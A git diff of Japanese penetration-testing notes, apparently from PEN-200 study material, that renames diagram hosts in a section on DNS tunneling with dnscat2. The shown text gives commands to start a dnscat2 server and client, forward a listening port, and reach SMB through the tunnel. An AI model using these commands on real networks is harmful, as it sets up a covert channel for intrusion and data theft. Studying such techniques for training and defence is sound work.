@@ -329,12 +329,12 @@ $$DNSリゾルバを介してデータが漏洩・侵入するイメージ(PEN-2
 
 ## DNS Tunneling w/ Dnscat2
 
-1. 権威サーバー上（上図ではFELINEAUTHORITY)でdnscat2 serverを起動
+1. 権威サーバー上（上図ではDNS server)でdnscat2 serverを起動
 ```zsh
 dnscat2-server <domain>
 ```
 
-2. DNSクライアント(上図ではPGDATABASE01)でdnscat2 clientを起動
+2. DNSクライアント(上図ではJump Host)でdnscat2 clientを起動
 ```zsh
 ./dnscat <domain>
 ```
@@ -355,5 +355,5 @@ listen 0.0.0.0:<listen_port> <target_IP>:<port>
 4. 攻撃者のマシンからリッスンポートにアクセスし任意の操作をする
 ```zsh
 # 例：smbclientの場合
-smbclient -U <username> --password=<password> -p <listen_port> -L //<権威サーバーIP>/
+smbclient -U <username> --password=<password> -p <listen_port> -L //<DNS_server_IP>/
 ```
